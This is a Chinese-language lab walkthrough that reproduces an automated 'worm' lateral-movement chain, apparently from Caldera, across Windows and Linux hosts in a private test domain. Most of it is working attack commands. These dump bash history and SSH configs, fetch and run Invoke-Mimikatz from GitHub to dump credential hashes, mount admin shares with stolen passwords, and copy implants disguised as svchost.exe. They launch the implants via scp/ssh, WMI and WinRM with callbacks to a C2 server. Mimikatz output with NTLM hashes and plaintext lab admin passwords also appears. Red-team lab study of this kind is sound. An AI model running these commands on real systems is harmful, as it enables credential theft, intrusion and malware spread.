> 本篇将复现 worm 经典链，对worm的描述是：尽一切可能去横向移动，所以linux和windows情况下使用的战术不同。

## 环境

> win2012(已上线) 172.29.2.215
>
> centos（已上线） 172.29.3.170
>
> win2016(AD) 172.29.3.66
>
> centos 172.29.3.189

 **域：** worm.lab

 **域管账号密码：**

> administrator
>
> zxcasdqwe123!@#

 **win2012本地管理员账户密码：**

> administrator
>
> zxcasdqwe123!@#

## 执行顺序

![image.png](https://image.3001.net/images/20221112/1668256958_636f94be6bf8295158789.png!small)

windows和linux执行顺序不一样，得分情况。

### linux

 **1.Parse SSH config**

这一步骤解析ssh配置文件，给出的命令：

    
    
    pip install -q stormssh 2> /dev/null && storm list | sed 's/\x1b\[[0-9;]*m//g'
    

由于网络环境不好，我直接先在本地装好`stormssh`,把命令改成：

    
    
    storm list | sed 's/\x1b\[[0-9;]*m//g'
    

前提条件：安装了pip。

结果：

![image.png](https://image.3001.net/images/20221112/1668264831_636fb37f06c6c26c650c7.png!small)

 **2.Dump history**

导出历史命令，筛选出ssh连接命令并保存，执行的命令：

    
    
    cat ~/.bash_history
    

结果：

![image.png](https://image.3001.net/images/20221112/1668264848_636fb3907d9bce3476eaa.png!small)

 **3.Collect ARP details**

使用`arp -a`命令收集信息，linux在执行`arp -a`的时候，超时时间应当延长一点，因为真的慢，我这里给到了5分钟。

![image.png](https://image.3001.net/images/20221112/1668264857_636fb399f18bcfacdd7e4.png!small)

 **4\. Copy 54ndc47 (WinRM and SCP)**

执行的命令：

    
    
    scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux root@172.29.3.189:~/sandcat.go
    

使用scp命令传输木马文件到目标，需要用到前面收集到的ssh信息。

前提条件：

> 有成功收集到ssh连接信息
>
> 有在目标机器的authorized_keys文件添加公钥信息，否则无法连接成功

第二个条件具体步骤：

> ssh-keygen命令，一直回车即可
>
> 在把`~/.ssh`目录下的`id_rsa.pub`文件内容，追加到目标`~/.ssh/authorized_keys`文件里 （如没有，手动创建即可）

 **5.Start 54ndc47**

执行的命令：

    
    
    scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux root@172.29.3.189:~/sandcat.go &&ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 root@172.29.3.189 'nohup ./sandcat.go -server http://172.29.2.129:8888 -group red 1>/dev/null 2>/dev/null &'
    

执行上一步传输过去的文件，成功上线目标。

![image.png](https://image.3001.net/images/20221112/1668264873_636fb3a98751370a542bc.png!small)

### Windows

 **1.View admin shares**

收集默认共享信息，执行的命令：

    
    
    Get-SmbShare | ConvertTo-Json
    

输出：

![image.png](https://image.3001.net/images/20221112/1668264883_636fb3b36ea76738fa696.png!small)

提取共享盘符信息。

前提条件：

> windows版本不能太低，至少win2012，否则无法使用`Get-SmbShare`命令

 **2.Collect ARP details**

使用`arp -a`收集ip信息，执行的命令：

    
    
    arp -a
    

结果：

![image.png](https://image.3001.net/images/20221112/1668264898_636fb3c20e99a881673ea.png!small)

并保存 ip 信息。

 **3\. Run PowerKatz**

使用mimikatz导出密码信息，给出的命令：

    
    
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
    $web = (New-Object System.Net.WebClient);
    $result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");
    iex $result; Invoke-Mimikatz -DumpCreds
    

执行过程为：

> 远程下载Invoke-Mimikatz.ps1
>
> 执行Invoke-Mimikatz.ps1导出密码

由于网络环境不好，我这里直接先在本地传输`Invoke-Mimikatz.ps1`,把命令改成：

    
    
    cd C:\Users\Administrator\Desktop;
    Import-Module .\Invoke-Mimikatz.ps1;
    Invoke-Mimikatz -DumpCreds
    

结果：

    
    
    .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
     .## ^ ##.  "A La Vie, A L'Amour"
     ## / \ ##  /* * *
     ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
      '#####'                                     with 20 modules * * */
    ERROR mimikatz_initOrClean ; CoInitializeEx: 80010106
    
    mimikatz(powershell) # sekurlsa::logonpasswords
    
    Authentication Id : 0 ; 11622424 (00000000:00b15818)
    Session           : RemoteInteractive from 1
    User Name         : Administrator
    Domain            : WIN2012
    Logon Server      : WIN2012
    Logon Time        : 11/2/2022 9:48:33 AM
    SID               : S-1-5-21-1571757309-1044897576-2348430239-500
    	msv :	
    	 [00010000] CredentialKeys
    	 * NTLM     : 6876836bc6ebce24a14c3f519e055c0e
    	 * SHA1     : b4bf8b270843c0cfd6a979ff45318a63d5851b81
    	 [00000003] Primary
    	 * Username : Administrator
    	 * Domain   : WIN2012
    	 * NTLM     : 6876836bc6ebce24a14c3f519e055c0e
    	 * SHA1     : b4bf8b270843c0cfd6a979ff45318a63d5851b81
    	tspkg :	
    	wdigest :	
    	 * Username : Administrator
    	 * Domain   : WIN2012
    	 * Password : (null)
    	kerberos :	
    	 * Username : Administrator
    	 * Domain   : WIN2012
    	 * Password : (null)
    	ssp :	KO
    	credman :	
    
    Authentication Id : 0 ; 11616286 (00000000:00b1401e)
    Session           : Interactive from 1
    User Name         : DWM-1
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 11/2/2022 9:48:33 AM
    SID               : S-1-5-90-1
    	msv :	
    	 [00000003] Primary
    	 * Username : WIN2012$
    	 * Domain   : WORM
    	 * NTLM     : bbbee47437172c4150fab6e687d3d7a8
    	 * SHA1     : 99c8ef08ed5362d70f16614c5c83b0c5365b7e0b
    	tspkg :	
    	wdigest :	
    	 * Username : WIN2012$
    	 * Domain   : WORM
    	 * Password : (null)
    	kerberos :	
    	 * Username : WIN2012$
    	 * Domain   : worm.lab
    	 * Password : x5tcbY;8-AYjQd^H@$>`TH;#x*5<bD9(W!EYBi%;5[2zl:yS0yeDvF1JVx&G,VFwy82vqh=95Y[ 9U(z:^AWuCqSOq9E!D*T39:XI?XehsOR+WZC7l9(.7OU
    	ssp :	KO
    	credman :	
    
    Authentication Id : 0 ; 11198100 (00000000:00aade94)
    Session           : Interactive from 3
    User Name         : jack
    Domain            : WORM
    Logon Server      : WIN2016
    Logon Time        : 11/2/2022 9:26:10 AM
    SID               : S-1-5-21-1976890432-1770843226-469972140-1107
    	msv :	
    	 [00000003] Primary
    	 * Username : jack
    	 * Domain   : WORM
    	 * NTLM     : 6876836bc6ebce24a14c3f519e055c0e
    	 * SHA1     : b4bf8b270843c0cfd6a979ff45318a63d5851b81
    	 [00010000] CredentialKeys
    	 * NTLM     : 6876836bc6ebce24a14c3f519e055c0e
    	 * SHA1     : b4bf8b270843c0cfd6a979ff45318a63d5851b81
    	tspkg :	
    	wdigest :	
    	 * Username : jack
    	 * Domain   : WORM
    	 * Password : (null)
    	kerberos :	
    	 * Username : jack
    	 * Domain   : WORM.LAB
    	 * Password : (null)
    	ssp :	KO
    	credman :	
    
    ...
    

很长，就不全部截下来了，win2012默认情况下是无法得到明文密码的，只有hash。

前提条件：

> 需要有管理员权限，否则无法导密码。

 **4\. Find Hostname**

根据前面`apr -a`收集到的 ip 信息，使用`nbtstat -A`命令一个一个收集网络信息。

![image.png](https://image.3001.net/images/20221112/1668264923_636fb3dbd40d51023f64f.png!small)

![image.png](https://image.3001.net/images/20221112/1668264931_636fb3e34057bf1faec59.png!small)

 **5.Reverse nslookup IP**

反向解析DNS记录，同样，根据前面`arp -a`收集到的 ip 信息，一个一个使用`nslookup`命令进行信息收集。

![image.png](https://image.3001.net/images/20221112/1668264941_636fb3ed1970b7e6a56bd.png!small)

结果：

![image.png](https://image.3001.net/images/20221112/1668264946_636fb3f2c0cb98279f82e.png!small)

这里要保存fqdn信息。

 **6\. Mount Share**

与目标机器尝试建立$IPC连接，其实就是猜密码，给出的命令：

    
    
    net use \\#{remote.host.fqdn}\C$ /user:#{domain.user.name} #{domain.user.password}
    

执行的命令：

    
    
    net use \\win2016.worm.lab\C$ /user:administrator zxcasdqwe123!@#
    

前提：

> 目标的fqdn
>
> 目标用户名
>
> 目标用户明文密码

这里的密码哪来的？前面第三步导出来的。但是我的机器是win2012,无法导出明文密码，于是手动添加。

 **7.Copy 54ndc47 (SMB)**

给出的命令：

    
    
    $path = "sandcat.go-windows";
    $drive = "\\#{remote.host.fqdn}\C$";
    Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
    

先把木马文件上传到已上线的机器，由于上一步与目标建立了连接，这一步直接把木马文件复制过去就行

执行的命令：

    
    
    $path = "sandcat.go-windows";
    $drive = "\\win2016.worm.lab\C$";
    Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
    

前提条件：

> 知道目标fqdn
>
> 与目标建立了$IPC连接

 **8.Copy 54ndc47 (WinRM and SCP)**

看一下给出的命令：

    
    
    $job = Start-Job -ScriptBlock {
      $username = "#{domain.user.name}";
      $password = "#{domain.user.password}";
      $secstr = New-Object -TypeName System.Security.SecureString;
      $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
      $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
      $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
      $location = "#{location}";
      $exe = "#{exe_name}";
      Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
      Start-Sleep -s 5;
      Remove-PSSession -Session $session;
    };
    Receive-Job -Job $job -Wait;
    

大概步骤：

> 使用目标账号密码与其建立会话
>
> 上传木马文件到已上线机器
>
> 复制木马文件到目标机器
>
> 移除会话

前提条件：

> domain.user.name 域用户名。注意：这里是域用户名，格式应当为： **域名\域用户**
>
> domain.user.password 即域用户的密码
>
> remote.host.name 目标主机名
>
> 双方都需要开 **WinRM**

剩下的变量会自动填写，最终执行的命令：

    
    
    $job = Start-Job -ScriptBlock {
        $username = "worm\administrator";
        $password = "zxcasdqwe123!@#";
        $secstr = New-Object -TypeName System.Security.SecureString;
        $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
        $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr; 	 $session = New-PSSession -ComputerName "win2016" -Credential $cred; 
        $location = "C:\Users\Public\splunkd.exe";
        $exe = "splunkd.exe";
        Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
        Start-Sleep -s 5;
        Remove-PSSession -Session $session;
    };
    Receive-Job -Job $job -Wait;
    

成功传输木马文件到目标机器`C:\Users\Public\svchost.exe`。

 **9\. Start 54ndc47 (WMI)**

使用wmic启动木马文件，给出的命令：

    
    
    $node = '''#{remote.host.fqdn}''';
    $user = '''#{domain.user.name}''';
    $password = '''#{domain.user.password}''';
    wmic /node:$node /user:$user /password:$password process call create "powershell.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}";
    

执行的命令：

    
    
    $node = '''win2016.worm.lab''';
    $user = '''administrator''';
    $password = '''zxcasdqwe123!@#''';
    wmic /node:$node /user:$user /password:$password process call create "powershell.exe C:\Users\Public\s4ndc4t.exe -server http://172.29.2.129:8888 -group red";
    

成功上线：

![image.png](https://image.3001.net/images/20221112/1668264967_636fb407110f214204e31.png!small)

前提条件：

> 目标的fqdn
>
> 目标用户名
>
> 目标用户明文密码

 **10.Start Agent (WinRM)**

这一步尝试启动第8步骤传输过去的`svchost.exe`。

给出的命令：

    
    
    $username = "#{domain.user.name}";
    $password = "#{domain.user.password}";
    $secstr = New-Object -TypeName System.Security.SecureString;
    $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
    $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
    $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
    Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} }};
    Start-Sleep -s 5;
    Remove-PSSession -Session $session;
    

建立会话之后直接执行命令 运行木马文件。

前提条件：

> domain.user.name 域用户名。注意：这里格式应当为： **域名\域用户**
>
> domain.user.password 即域用户的密码
>
> remote.host.name 目标主机名
>
> 双方都需要开 **WinRM**

最终执行的命令：

    
    
    $username = "worm\administrator";
    $password = "zxcasdqwe123!@#";
    $secstr = New-Object -TypeName System.Security.SecureString;$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
    $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
    $session = New-PSSession -ComputerName win2016 -Credential $cred;
    Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server http://172.29.2.129:8888 }};
    Start-Sleep -s 5;
    Remove-PSSession -Session $session;
    

成功上线：

![image.png](https://image.3001.net/images/20221112/1668264974_636fb40e9c20db480c913.png!small)

